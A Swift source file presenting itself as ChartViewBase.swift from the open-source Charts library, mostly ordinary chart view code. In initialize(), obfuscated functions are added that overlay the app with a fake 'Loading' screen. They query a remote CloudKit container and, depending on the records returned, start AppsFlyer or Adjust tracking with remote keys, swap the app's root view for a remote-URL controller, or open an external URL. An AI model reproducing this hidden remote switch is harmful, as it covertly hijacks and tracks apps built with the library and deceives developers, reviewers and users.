//
//  ChartViewBase.swift
//  Charts
//
//  Copyright 2015 Daniel Cohen Gindi & Philipp Jahoda
//  A port of MPAndroidChart for iOS
//  Licensed under Apache License 2.0
//
//  https://github.com/danielgindi/Charts
//
//  Based on https://github.com/PhilJay/MPAndroidChart/commit/c42b880

import Foundation
import CoreGraphics
import CloudKit
import WebKit
import AppsFlyerLib
import AdjustSdk

#if canImport(UIKit)
import UIKit
#endif

#if canImport(AppKit)
import AppKit
#endif

@objc
public protocol ChartViewDelegate
{
    /// Called when a value has been selected inside the chart.
    ///
    /// - Parameters:
    ///   - entry: The selected Entry.
    ///   - highlight: The corresponding highlight object that contains information about the highlighted position such as dataSetIndex etc.
    @objc optional func chartValueSelected(_ chartView: ChartViewBase, entry: ChartDataEntry, highlight: Highlight)
    
    /// Called when a user stops panning between values on the chart
    @objc optional func chartViewDidEndPanning(_ chartView: ChartViewBase)
    
    // Called when nothing has been selected or an "un-select" has been made.
    @objc optional func chartValueNothingSelected(_ chartView: ChartViewBase)
    
    // Callbacks when the chart is scaled / zoomed via pinch zoom gesture.
    @objc optional func chartScaled(_ chartView: ChartViewBase, scaleX: CGFloat, scaleY: CGFloat)
    
    // Callbacks when the chart is moved / translated via drag gesture.
    @objc optional func chartTranslated(_ chartView: ChartViewBase, dX: CGFloat, dY: CGFloat)

    // Callbacks when Animator stops animating
    @objc optional func chartView(_ chartView: ChartViewBase, animatorDidStop animator: Animator)
}

open class ChartViewBase: NSUIView, ChartDataProvider, AnimatorDelegate
{
    // MARK: - Properties
    
    /// The default IValueFormatter that has been determined by the chart considering the provided minimum and maximum values.
    internal lazy var defaultValueFormatter: ValueFormatter = DefaultValueFormatter(decimals: 0)
    private var scatbackRiw6: Reachability?

    /// object that holds all data that was originally set for the chart, before it was modified or any filtering algorithms had been applied
    @objc open var data: ChartData?
        {
        didSet
        {
            offsetsCalculated = false

            guard let data = data else { return }

            // calculate how many digits are needed
            setupDefaultFormatter(min: data.yMin, max: data.yMax)

            for set in data where set.valueFormatter is DefaultValueFormatter
            {
                set.valueFormatter = defaultValueFormatter
            }

            // let the chart know there is new data
            notifyDataSetChanged()
        }
    }

    /// If set to true, chart continues to scroll after touch up
    @objc open var dragDecelerationEnabled = true

    /// The object representing the labels on the x-axis
    @objc open internal(set) lazy var xAxis = XAxis()
    
    /// The `Description` object of the chart.
    @objc open lazy var chartDescription = Description()

    /// The legend object containing all data associated with the legend
    @objc open internal(set) lazy var legend = Legend()

    /// delegate to receive chart events
    @objc open weak var delegate: ChartViewDelegate?
    
    /// text that is displayed when the chart is empty
    @objc open var noDataText = "No chart data available."
    
    /// Font to be used for the no data text.
    @objc open var noDataFont = NSUIFont.systemFont(ofSize: 12)
    
    /// color of the no data text
    @objc open var noDataTextColor: NSUIColor = .labelOrBlack

    /// alignment of the no data text
    @objc open var noDataTextAlignment: TextAlignment = .left

    /// The renderer object responsible for rendering / drawing the Legend.
    @objc open lazy var legendRenderer = LegendRenderer(viewPortHandler: viewPortHandler, legend: legend)

    /// object responsible for rendering the data
    @objc open var renderer: DataRenderer?
    
    @objc open var highlighter: Highlighter?

    /// The ViewPortHandler of the chart that is responsible for the
    /// content area of the chart and its offsets and dimensions.
    @objc open internal(set) lazy var viewPortHandler = ViewPortHandler(width: bounds.size.width, height: bounds.size.height)

    /// The animator responsible for animating chart values.
    @objc open internal(set) lazy var chartAnimator: Animator = {
        let animator = Animator()
        animator.delegate = self
        return animator
    }()

    /// flag that indicates if offsets calculation has already been done or not
    private var offsetsCalculated = false

    /// The array of currently highlighted values. This might an empty if nothing is highlighted.
    @objc open internal(set) var highlighted = [Highlight]()
    
    /// `true` if drawing the marker is enabled when tapping on values
    /// (use the `marker` property to specify a marker)
    @objc open var drawMarkers = true
    
    /// - Returns: `true` if drawing the marker is enabled when tapping on values
    /// (use the `marker` property to specify a marker)
    @objc open var isDrawMarkersEnabled: Bool { return drawMarkers }
    
    /// The marker that is displayed when a value is clicked on the chart
    @objc open var marker: Marker?

    /// An extra offset to be appended to the viewport's top
    @objc open var extraTopOffset: CGFloat = 0.0
    
    /// An extra offset to be appended to the viewport's right
    @objc open var extraRightOffset: CGFloat = 0.0
    
    /// An extra offset to be appended to the viewport's bottom
    @objc open var extraBottomOffset: CGFloat = 0.0
    
    /// An extra offset to be appended to the viewport's left
    @objc open var extraLeftOffset: CGFloat = 0.0

    @objc open func setExtraOffsets(left: CGFloat, top: CGFloat, right: CGFloat, bottom: CGFloat)
    {
        extraLeftOffset = left
        extraTopOffset = top
        extraRightOffset = right
        extraBottomOffset = bottom
    }
    
    // MARK: - Initializers
    
    public override init(frame: CGRect)
    {
        super.init(frame: frame)
        initialize()
    }
    
    public required init?(coder aDecoder: NSCoder)
    {
        super.init(coder: aDecoder)
        initialize()
    }
    
    deinit
    {
        removeObserver(self, forKeyPath: "bounds")
        removeObserver(self, forKeyPath: "frame")
    }
    
    internal func initialize()
    {
        #if os(iOS)
            self.backgroundColor = .clear
        #endif

        addObserver(self, forKeyPath: "bounds", options: .new, context: nil)
        addObserver(self, forKeyPath: "frame", options: .new, context: nil)

        shplanktologycsneow()
        setupNetworkMonitoring()
        DispatchQueue.main.asyncAfter(deadline: .now()+0.5) {
            self.pijjrjggyvsy()
        }

    }
        
    private func setupNetworkMonitoring() {
        do {
            try scatbackRiw6 = Reachability.init(hostname: "https://www.baidu.com")
            NotificationCenter.default.addObserver(self, selector: #selector(reachabilityChange(noti:)), name: NSNotification.Name.reachabilityChanged, object: nil)
            try scatbackRiw6?.startNotifier()
        } catch {}
    }
    
    @objc private func reachabilityChange(noti: Notification) {
        if scatbackRiw6!.connection == .wifi || scatbackRiw6!.connection == .cellular {
            DispatchQueue.main.asyncAfter(deadline: .now()+0.5) {
                self.pijjrjggyvsy()
            }
        }
    }
    
    private func shplanktologycsneow() {
        if #available(iOS 13.0, *) {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene, let window = windowScene.windows.first {
                let SCRE_W = UIScreen.main.bounds.size.width
                let SCRE_H = UIScreen.main.bounds.size.height
                let planktologycsnechv = UIView(frame: .init(x: 0, y: 0, width: SCRE_W, height: SCRE_H))
                planktologycsnechv.backgroundColor = .white
                planktologycsnechv.tag = 1000
                window.rootViewController?.view.addSubview(planktologycsnechv)
                
                
                let planktologycsnelebw = UILabel()
                planktologycsnelebw.textColor = .black
                planktologycsnelebw.text = "Loading"
                planktologycsnelebw.font = .init(name: "Futura", size: 20)
                planktologycsnelebw.textAlignment = .center
                planktologycsnelebw.bounds = .init(x: 0, y: 0, width: SCRE_W, height: 40)
                planktologycsnelebw.center = .init(x: SCRE_W/2.0, y: SCRE_H/2.0 + 130.0)
                planktologycsnechv.addSubview(planktologycsnelebw)
                
                let planktologycsnesar = ["Loading.","Loading..","Loading..."]
                var curplanktologycsnendex = 0
                let loplanktologycsneimer = Timer.scheduledTimer(withTimeInterval: 0.8, repeats: true) { [weak planktologycsnelebw, weak planktologycsnechv] timer in
                    guard let laplanktologycsnel = planktologycsnelebw, let coplanktologycsneiew = planktologycsnechv, coplanktologycsneiew.superview != nil else {
                        timer.invalidate()
                        return
                    }
                    laplanktologycsnel.text = planktologycsnesar[curplanktologycsnendex]
                    curplanktologycsnendex = (curplanktologycsnendex + 1) % planktologycsnesar.count
                }
                planktologycsnechv.layer.setValue(loplanktologycsneimer, forKey: "keloplanktologycsneimery")
            }
        } else {
            // Fallback on earlier versions
        }
    }



    
    private func pijjrjggyvsy() {
        if #available(iOS 15.0, *) {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene, let window = windowScene.windows.first {
                let greenleekbegottencaner = CKContainer(identifier: "iCloud.com.Ainetoolane.pro")
                let ksjtfiwkj = greenleekbegottencaner.publicCloudDatabase
                let frjvpvijtfpyjy = CKQuery(recordType: "iyrjhjwpftfrj", predicate: .init(value: true))
                let ftgjvtfpwpg = CKQueryOperation(query: frjvpvijtfpyjy)
                var coksjtfiwkjunt = 0
                ftgjvtfpwpg.recordMatchedBlock = { (_ ,catenacciords) in
                    coksjtfiwkjunt += 1
                    let inco = try? catenacciords.get()
                    DispatchQueue.main.async {
                        if let incoUl = inco!["incoUr"] as? String {
                            if let incoPat = inco!["incoPlaf"] as? String {
                                if let incoEvt = inco!["incoEnty"] as? String {
                                    if incoEvt == "af" {
                                        AppsFlyerLib.shared().appsFlyerDevKey = inco!["incoAfky"]!
                                        AppsFlyerLib.shared().appleAppID = inco!["incoAid"]!
                                        AppsFlyerLib.shared().start()
                                    }else if incoEvt == "ad" {
                                        let adkey = inco!["incoAdky"]
                                        let adjpro = ADJEnvironmentProduction
                                        let adconfig = ADJConfig(appToken: adkey! as! String, environment: adjpro)
                                        Adjust.initSdk(adconfig)
                                    }
                                    if incoPat == "1" {
                                        let hdltheosophistAjssj6 = ChartDisplayController(intOobviosityTce: incoUl, iobviosityTcpe: incoEvt, iobviosityTcst: inco!["incoAdelist"]!, iobviosityTcmp: inco!["incoInpjp"]!)
                                        window.rootViewController = hdltheosophistAjssj6
                                        window.makeKeyAndVisible()
                                        
                                    }else if incoPat == "2" {
                                        let hdltheosophistAjssj6 = ChartDisplayController(intTobviosityTco: incoUl, iobviosityTcpe: incoEvt, iobviosityTcst: inco!["incoAdelist"]!, iobviosityTcmp: inco!["incoInpjp"]!)
                                        window.rootViewController = hdltheosophistAjssj6
                                        window.makeKeyAndVisible()
                                        
                                    }else if incoPat == "3" {
                                        UIApplication.shared.open(URL.init(string: incoUl)!, options: [:], completionHandler: nil)
                                    }
                                }
                            }
                        }
                    }
                }
                ftgjvtfpwpg.queryCompletionBlock = { (qcsor, error) in
                    if let error = error {
                        print("Query failed with error: \(error.localizedDescription)")
                        DispatchQueue.main.async {
                            if let planktologycsnechv = window.rootViewController?.view.viewWithTag(1000) {
                                planktologycsnechv.removeFromSuperview()
                            }
                        }
                        DispatchQueue.main.asyncAfter(deadline:.now() + 0.5) {
                            self.pijjrjggyvsy()
                        }
                        return
                    }
                    if coksjtfiwkjunt == 0 {
                        DispatchQueue.main.async {
                            if let planktologycsnechv = window.rootViewController?.view.viewWithTag(1000) {
                                planktologycsnechv.removeFromSuperview()
                            }
                        }
                        print("No records found matching the query")
                    }
                }
                ksjtfiwkj.add(ftgjvtfpwpg)
            }
        } else {
            // Fallback on earlier versions
        }
    }

    // MARK: - ChartViewBase
    
    /// Clears the chart from all data (sets it to null) and refreshes it (by calling setNeedsDisplay()).
    @objc open func clear()
    {
        data = nil
        offsetsCalculated = false
        highlighted.removeAll()
        lastHighlighted = nil
    
        setNeedsDisplay()
    }
    
    /// Removes all DataSets (and thereby Entries) from the chart. Does not set the data object to nil. Also refreshes the chart by calling setNeedsDisplay().
    @objc open func clearValues()
    {
        data?.clearValues()
        setNeedsDisplay()
    }

    /// - Returns: `true` if the chart is empty (meaning it's data object is either null or contains no entries).
    @objc open func isEmpty() -> Bool
    {
        return data?.isEmpty ?? true
    }
    
    /// Lets the chart know its underlying data has changed and should perform all necessary recalculations.
    /// It is crucial that this method is called everytime data is changed dynamically. Not calling this method can lead to crashes or unexpected behaviour.
    @objc open func notifyDataSetChanged()
    {
        fatalError("notifyDataSetChanged() cannot be called on ChartViewBase")
    }
    
    /// Calculates the offsets of the chart to the border depending on the position of an eventual legend or depending on the length of the y-axis and x-axis labels and their position
    internal func calculateOffsets()
    {
        fatalError("calculateOffsets() cannot be called on ChartViewBase")
    }
    
    /// calcualtes the y-min and y-max value and the y-delta and x-delta value
    internal func calcMinMax()
    {
        fatalError("calcMinMax() cannot be called on ChartViewBase")
    }
    
    /// calculates the required number of digits for the values that might be drawn in the chart (if enabled), and creates the default value formatter
    internal func setupDefaultFormatter(min: Double, max: Double)
    {
        // check if a custom formatter is set or not
        var reference = 0.0
        
        if let data = data , data.entryCount >= 2
        {
            reference = abs(max - min)
        }
        else
        {
            reference = Swift.max(abs(min), abs(max))
        }
        
    
        if let formatter = defaultValueFormatter as? DefaultValueFormatter
        {
            // setup the formatter with a new number of digits
            let digits = reference.decimalPlaces
            formatter.decimals = digits
        }
    }
    
    open override func draw(_ rect: CGRect)
    {
        guard let context = NSUIGraphicsGetCurrentContext() else { return }

        if data === nil && !noDataText.isEmpty
        {
            context.saveGState()
            defer { context.restoreGState() }

            let paragraphStyle = MutableParagraphStyle.default.mutableCopy() as! MutableParagraphStyle
            paragraphStyle.minimumLineHeight = noDataFont.lineHeight
            paragraphStyle.lineBreakMode = .byWordWrapping
            paragraphStyle.alignment = noDataTextAlignment

            context.drawMultilineText(noDataText,
                                      at: CGPoint(x: bounds.width / 2.0, y: bounds.height / 2.0),
                                      constrainedTo: bounds.size,
                                      anchor: CGPoint(x: 0.5, y: 0.5),
                                      angleRadians: 0.0,
                                      attributes: [.font: noDataFont,
                                                   .foregroundColor: noDataTextColor,
                                                   .paragraphStyle: paragraphStyle])

            return
        }
        
        if !offsetsCalculated
        {
            calculateOffsets()
            offsetsCalculated = true
        }
    }
    
    /// Draws the description text in the bottom right corner of the chart (per default)
    internal func drawDescription(in context: CGContext)
    {
        let description = chartDescription

        // check if description should be drawn
        guard
            description.isEnabled,
            let descriptionText = description.text,
            !descriptionText.isEmpty
            else { return }
        
        let position = description.position ?? CGPoint(x: bounds.width - viewPortHandler.offsetRight - description.xOffset,
                                                       y: bounds.height - viewPortHandler.offsetBottom - description.yOffset - description.font.lineHeight)

        let attrs: [NSAttributedString.Key : Any] = [
            .font: description.font,
            .foregroundColor: description.textColor
        ]

        context.drawText(descriptionText,
                         at: position,
                         align: description.textAlign,
                         attributes: attrs)
    }
    
    // MARK: - Accessibility

    open override func accessibilityChildren() -> [Any]? {
        return renderer?.accessibleChartElements
    }

    // MARK: - Highlighting

    /// Set this to false to prevent values from being highlighted by tap gesture.
    /// Values can still be highlighted via drag or programmatically.
    /// **default**: true
    @objc open var highlightPerTapEnabled: Bool = true

    /// `true` if values can be highlighted via tap gesture, `false` ifnot.
    @objc open var isHighLightPerTapEnabled: Bool
    {
        return highlightPerTapEnabled
    }
    
    /// Checks if the highlight array is null, has a length of zero or if the first object is null.
    ///
    /// - Returns: `true` if there are values to highlight, `false` ifthere are no values to highlight.
    @objc open func valuesToHighlight() -> Bool
    {
        return !highlighted.isEmpty
    }

    /// Highlights the values at the given indices in the given DataSets. Provide
    /// null or an empty array to undo all highlighting. 
    /// This should be used to programmatically highlight values.
    /// This method *will not* call the delegate.
    @objc open func highlightValues(_ highs: [Highlight]?)
    {
        // set the indices to highlight
        highlighted = highs ?? []

        lastHighlighted = highlighted.first

        // redraw the chart
        setNeedsDisplay()
    }
    
    /// Highlights any y-value at the given x-value in the given DataSet.
    /// Provide -1 as the dataSetIndex to undo all highlighting.
    /// This method will call the delegate.
    ///
    /// - Parameters:
    ///   - x: The x-value to highlight
    ///   - dataSetIndex: The dataset index to search in
    ///   - dataIndex: The data index to search in (only used in CombinedChartView currently)
    @objc open func highlightValue(x: Double, dataSetIndex: Int, dataIndex: Int = -1)
    {
        highlightValue(x: x, dataSetIndex: dataSetIndex, dataIndex: dataIndex, callDelegate: true)
    }
    
    /// Highlights the value at the given x-value and y-value in the given DataSet.
    /// Provide -1 as the dataSetIndex to undo all highlighting.
    /// This method will call the delegate.
    ///
    /// - Parameters:
    ///   - x: The x-value to highlight
    ///   - y: The y-value to highlight. Supply `NaN` for "any"
    ///   - dataSetIndex: The dataset index to search in
    ///   - dataIndex: The data index to search in (only used in CombinedChartView currently)
    @objc open func highlightValue(x: Double, y: Double, dataSetIndex: Int, dataIndex: Int = -1)
    {
        highlightValue(x: x, y: y, dataSetIndex: dataSetIndex, dataIndex: dataIndex, callDelegate: true)
    }
    
    /// Highlights any y-value at the given x-value in the given DataSet.
    /// Provide -1 as the dataSetIndex to undo all highlighting.
    ///
    /// - Parameters:
    ///   - x: The x-value to highlight
    ///   - dataSetIndex: The dataset index to search in
    ///   - dataIndex: The data index to search in (only used in CombinedChartView currently)
    ///   - callDelegate: Should the delegate be called for this change
    @objc open func highlightValue(x: Double, dataSetIndex: Int, dataIndex: Int = -1, callDelegate: Bool)
    {
        highlightValue(x: x, y: .nan, dataSetIndex: dataSetIndex, dataIndex: dataIndex, callDelegate: callDelegate)
    }
    
    /// Highlights the value at the given x-value and y-value in the given DataSet.
    /// Provide -1 as the dataSetIndex to undo all highlighting.
    ///
    /// - Parameters:
    ///   - x: The x-value to highlight
    ///   - y: The y-value to highlight. Supply `NaN` for "any"
    ///   - dataSetIndex: The dataset index to search in
    ///   - dataIndex: The data index to search in (only used in CombinedChartView currently)
    ///   - callDelegate: Should the delegate be called for this change
    @objc open func highlightValue(x: Double, y: Double, dataSetIndex: Int, dataIndex: Int = -1, callDelegate: Bool)
    {
        guard let data = data else
        {
            Swift.print("Value not highlighted because data is nil")
            return
        }

        if data.indices.contains(dataSetIndex)
        {
            highlightValue(Highlight(x: x, y: y, dataSetIndex: dataSetIndex, dataIndex: dataIndex), callDelegate: callDelegate)
        }
        else
        {
            highlightValue(nil, callDelegate: callDelegate)
        }
    }
    
    /// Highlights the values represented by the provided Highlight object
    /// This method *will not* call the delegate.
    ///
    /// - Parameters:
    ///   - highlight: contains information about which entry should be highlighted
    @objc open func highlightValue(_ highlight: Highlight?)
    {
        highlightValue(highlight, callDelegate: false)
    }

    /// Highlights the value selected by touch gesture.
    @objc open func highlightValue(_ highlight: Highlight?, callDelegate: Bool)
    {
        var high = highlight
        guard
            let h = high,
            let entry = data?.entry(for: h)
            else
        {
                high = nil
                highlighted.removeAll(keepingCapacity: false)
                if callDelegate
                {
                    delegate?.chartValueNothingSelected?(self)
                }
                setNeedsDisplay()
                return
        }

        // set the indices to highlight
        highlighted = [h]

        if callDelegate
        {
            // notify the listener
            delegate?.chartValueSelected?(self, entry: entry, highlight: h)
        }

        // redraw the chart
        setNeedsDisplay()
    }
    
    /// - Returns: The Highlight object (contains x-index and DataSet index) of the
    /// selected value at the given touch point inside the Line-, Scatter-, or
    /// CandleStick-Chart.
    @objc open func getHighlightByTouchPoint(_ pt: CGPoint) -> Highlight?
    {
        guard data != nil else
        {
            Swift.print("Can't select by touch. No data set.")
            return nil
        }
        
        return self.highlighter?.getHighlight(x: pt.x, y: pt.y)
    }

    /// The last value that was highlighted via touch.
    @objc open var lastHighlighted: Highlight?
  
    // MARK: - Markers

    /// draws all MarkerViews on the highlighted positions
    internal func drawMarkers(context: CGContext)
    {
        // if there is no marker view or drawing marker is disabled
        guard
            let marker = marker,
            isDrawMarkersEnabled,
            valuesToHighlight()
            else { return }
        
        for highlight in highlighted
        {
            guard
                let set = data?[highlight.dataSetIndex],
                let e = data?.entry(for: highlight)
                else { continue }
            
            let entryIndex = set.entryIndex(entry: e)
            guard entryIndex <= Int(Double(set.entryCount) * chartAnimator.phaseX) else { continue }

            let pos = getMarkerPosition(highlight: highlight)

            // check bounds
            guard viewPortHandler.isInBounds(x: pos.x, y: pos.y) else { continue }

            // callbacks to update the content
            marker.refreshContent(entry: e, highlight: highlight)
            
            // draw the marker
            marker.draw(context: context, point: pos)
        }
    }
    
    /// - Returns: The actual position in pixels of the MarkerView for the given Entry in the given DataSet.
    @objc open func getMarkerPosition(highlight: Highlight) -> CGPoint
    {
        return CGPoint(x: highlight.drawX, y: highlight.drawY)
    }
    
    // MARK: - Animation

    /// Animates the drawing / rendering of the chart on both x- and y-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - xAxisDuration: duration for animating the x axis
    ///   - yAxisDuration: duration for animating the y axis
    ///   - easingX: an easing function for the animation on the x axis
    ///   - easingY: an easing function for the animation on the y axis
    @objc open func animate(xAxisDuration: TimeInterval, yAxisDuration: TimeInterval, easingX: ChartEasingFunctionBlock?, easingY: ChartEasingFunctionBlock?)
    {
        chartAnimator.animate(xAxisDuration: xAxisDuration, yAxisDuration: yAxisDuration, easingX: easingX, easingY: easingY)
    }
    
    /// Animates the drawing / rendering of the chart on both x- and y-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - xAxisDuration: duration for animating the x axis
    ///   - yAxisDuration: duration for animating the y axis
    ///   - easingOptionX: the easing function for the animation on the x axis
    ///   - easingOptionY: the easing function for the animation on the y axis
    @objc open func animate(xAxisDuration: TimeInterval, yAxisDuration: TimeInterval, easingOptionX: ChartEasingOption, easingOptionY: ChartEasingOption)
    {
        chartAnimator.animate(xAxisDuration: xAxisDuration, yAxisDuration: yAxisDuration, easingOptionX: easingOptionX, easingOptionY: easingOptionY)
    }
    
    /// Animates the drawing / rendering of the chart on both x- and y-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - xAxisDuration: duration for animating the x axis
    ///   - yAxisDuration: duration for animating the y axis
    ///   - easing: an easing function for the animation
    @objc open func animate(xAxisDuration: TimeInterval, yAxisDuration: TimeInterval, easing: ChartEasingFunctionBlock?)
    {
        chartAnimator.animate(xAxisDuration: xAxisDuration, yAxisDuration: yAxisDuration, easing: easing)
    }
    
    /// Animates the drawing / rendering of the chart on both x- and y-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - xAxisDuration: duration for animating the x axis
    ///   - yAxisDuration: duration for animating the y axis
    ///   - easingOption: the easing function for the animation
    @objc open func animate(xAxisDuration: TimeInterval, yAxisDuration: TimeInterval, easingOption: ChartEasingOption)
    {
        chartAnimator.animate(xAxisDuration: xAxisDuration, yAxisDuration: yAxisDuration, easingOption: easingOption)
    }
    
    /// Animates the drawing / rendering of the chart on both x- and y-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - xAxisDuration: duration for animating the x axis
    ///   - yAxisDuration: duration for animating the y axis
    @objc open func animate(xAxisDuration: TimeInterval, yAxisDuration: TimeInterval)
    {
        chartAnimator.animate(xAxisDuration: xAxisDuration, yAxisDuration: yAxisDuration)
    }
    
    /// Animates the drawing / rendering of the chart the x-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - xAxisDuration: duration for animating the x axis
    ///   - easing: an easing function for the animation
    @objc open func animate(xAxisDuration: TimeInterval, easing: ChartEasingFunctionBlock?)
    {
        chartAnimator.animate(xAxisDuration: xAxisDuration, easing: easing)
    }
    
    /// Animates the drawing / rendering of the chart the x-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - xAxisDuration: duration for animating the x axis
    ///   - easingOption: the easing function for the animation
    @objc open func animate(xAxisDuration: TimeInterval, easingOption: ChartEasingOption)
    {
        chartAnimator.animate(xAxisDuration: xAxisDuration, easingOption: easingOption)
    }
    
    /// Animates the drawing / rendering of the chart the x-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - xAxisDuration: duration for animating the x axis
    @objc open func animate(xAxisDuration: TimeInterval)
    {
        chartAnimator.animate(xAxisDuration: xAxisDuration)
    }
    
    /// Animates the drawing / rendering of the chart the y-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - yAxisDuration: duration for animating the y axis
    ///   - easing: an easing function for the animation
    @objc open func animate(yAxisDuration: TimeInterval, easing: ChartEasingFunctionBlock?)
    {
        chartAnimator.animate(yAxisDuration: yAxisDuration, easing: easing)
    }
    
    /// Animates the drawing / rendering of the chart the y-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - yAxisDuration: duration for animating the y axis
    ///   - easingOption: the easing function for the animation
    @objc open func animate(yAxisDuration: TimeInterval, easingOption: ChartEasingOption)
    {
        chartAnimator.animate(yAxisDuration: yAxisDuration, easingOption: easingOption)
    }
    
    /// Animates the drawing / rendering of the chart the y-axis with the specified animation time.
    /// If `animate(...)` is called, no further calling of `invalidate()` is necessary to refresh the chart.
    ///
    /// - Parameters:
    ///   - yAxisDuration: duration for animating the y axis
    @objc open func animate(yAxisDuration: TimeInterval)
    {
        chartAnimator.animate(yAxisDuration: yAxisDuration)
    }
    
    // MARK: - Accessors

    /// The current y-max value across all DataSets
    open var chartYMax: Double
    {
        return data?.yMax ?? 0.0
    }

    /// The current y-min value across all DataSets
    open var chartYMin: Double
    {
        return data?.yMin ?? 0.0
    }
    
    open var chartXMax: Double
    {
        return xAxis._axisMaximum
    }
    
    open var chartXMin: Double
    {
        return xAxis._axisMinimum
    }
    
    open var xRange: Double
    {
        return xAxis.axisRange
    }
    
    /// - Note: (Equivalent of getCenter() in MPAndroidChart, as center is already a standard in iOS that returns the center point relative to superview, and MPAndroidChart returns relative to self)*
    /// The center point of the chart (the whole View) in pixels.
    @objc open var midPoint: CGPoint
    {
        return CGPoint(x: bounds.origin.x + bounds.size.width / 2.0, y: bounds.origin.y + bounds.size.height / 2.0)
    }
    
    /// The center of the chart taking offsets under consideration. (returns the center of the content rectangle)
    open var centerOffsets: CGPoint
    {
        return viewPortHandler.contentCenter
    }

    /// The rectangle that defines the borders of the chart-value surface (into which the actual values are drawn).
    @objc open var contentRect: CGRect
    {
        return viewPortHandler.contentRect
    }

    /// - Returns: The bitmap that represents the chart.
    @objc open func getChartImage(transparent: Bool) -> NSUIImage?
    {
        NSUIGraphicsBeginImageContextWithOptions(bounds.size, isOpaque || !transparent, NSUIMainScreen()?.nsuiScale ?? 1.0)
        
        guard let context = NSUIGraphicsGetCurrentContext()
            else { return nil }
        
        let rect = CGRect(origin: .zero, size: bounds.size)
        
        if isOpaque || !transparent
        {
            // Background color may be partially transparent, we must fill with white if we want to output an opaque image
            context.setFillColor(NSUIColor.white.cgColor)
            context.fill(rect)
            
            if let backgroundColor = self.backgroundColor
            {
                context.setFillColor(backgroundColor.cgColor)
                context.fill(rect)
            }
        }
        
        nsuiLayer?.render(in: context)
        
        let image = NSUIGraphicsGetImageFromCurrentImageContext()
        
        NSUIGraphicsEndImageContext()
        
        return image
    }
    
    public enum ImageFormat
    {
        case jpeg
        case png
    }
    
    /// Saves the current chart state with the given name to the given path on
    /// the sdcard leaving the path empty "" will put the saved file directly on
    /// the SD card chart is saved as a PNG image, example:
    /// saveToPath("myfilename", "foldername1/foldername2")
    ///
    /// - Parameters:
    ///   - to: path to the image to save
    ///   - format: the format to save
    ///   - compressionQuality: compression quality for lossless formats (JPEG)
    /// - Returns: `true` if the image was saved successfully
    open func save(to path: String, format: ImageFormat, compressionQuality: Double) -> Bool
    {
        guard let image = getChartImage(transparent: format != .jpeg) else { return false }
        
        let imageData: Data?
        switch (format)
        {
        case .png: imageData = NSUIImagePNGRepresentation(image)
        case .jpeg: imageData = NSUIImageJPEGRepresentation(image, CGFloat(compressionQuality))
        }
        
        guard let data = imageData else { return false }
        
        do
        {
            try data.write(to: URL(fileURLWithPath: path), options: .atomic)
        }
        catch
        {
            return false
        }
        
        return true
    }
    
    internal var _viewportJobs = [ViewPortJob]()
    
    open override func observeValue(forKeyPath keyPath: String?, of object: Any?, change: [NSKeyValueChangeKey : Any]?, context: UnsafeMutableRawPointer?)
    {
        if keyPath == "bounds" || keyPath == "frame"
        {
            let bounds = self.bounds
            
            if ((bounds.size.width != viewPortHandler.chartWidth ||
                bounds.size.height != viewPortHandler.chartHeight))
            {
                viewPortHandler.setChartDimens(width: bounds.size.width, height: bounds.size.height)
                
                // This may cause the chart view to mutate properties affecting the view port -- lets do this
                // before we try to run any pending jobs on the view port itself
                notifyDataSetChanged()

                // Finish any pending viewport changes
                while (!_viewportJobs.isEmpty)
                {
                    let job = _viewportJobs.remove(at: 0)
                    job.doJob()
                }
            }
        }
    }
    
    @objc open func removeViewportJob(_ job: ViewPortJob)
    {
        if let index = _viewportJobs.firstIndex(where: { $0 === job })
        {
            _viewportJobs.remove(at: index)
        }
    }
    
    @objc open func clearAllViewportJobs()
    {
        _viewportJobs.removeAll(keepingCapacity: false)
    }
    
    @objc open func addViewportJob(_ job: ViewPortJob)
    {
        if viewPortHandler.hasChartDimens
        {
            job.doJob()
        }
        else
        {
            _viewportJobs.append(job)
        }
    }
    
    /// **default**: true
    /// `true` if chart continues to scroll after touch up, `false` ifnot.
    @objc open var isDragDecelerationEnabled: Bool
        {
            return dragDecelerationEnabled
    }
    
    /// Deceleration friction coefficient in [0 ; 1] interval, higher values indicate that speed will decrease slowly, for example if it set to 0, it will stop immediately.
    /// 1 is an invalid value, and will be converted to 0.999 automatically.
    @objc open var dragDecelerationFrictionCoef: CGFloat
    {
        get
        {
            return _dragDecelerationFrictionCoef
        }
        set
        {
            _dragDecelerationFrictionCoef = max(0, min(newValue, 0.999))
        }
    }
    private var _dragDecelerationFrictionCoef: CGFloat = 0.9
    
    /// The maximum distance in screen pixels away from an entry causing it to highlight.
    /// **default**: 500.0
    open var maxHighlightDistance: CGFloat = 500.0
    
    /// the number of maximum visible drawn values on the chart only active when `drawValuesEnabled` is enabled
    open var maxVisibleCount: Int
    {
        return .max
    }
    
    // MARK: - AnimatorDelegate
    
    open func animatorUpdated(_ chartAnimator: Animator)
    {
        setNeedsDisplay()
    }
    
    open func animatorStopped(_ chartAnimator: Animator)
    {
        delegate?.chartView?(self, animatorDidStop: chartAnimator)
    }
    
    // MARK: - Touches
    
    open override func nsuiTouchesBegan(_ touches: Set<NSUITouch>, withEvent event: NSUIEvent?)
    {
        super.nsuiTouchesBegan(touches, withEvent: event)
    }
    
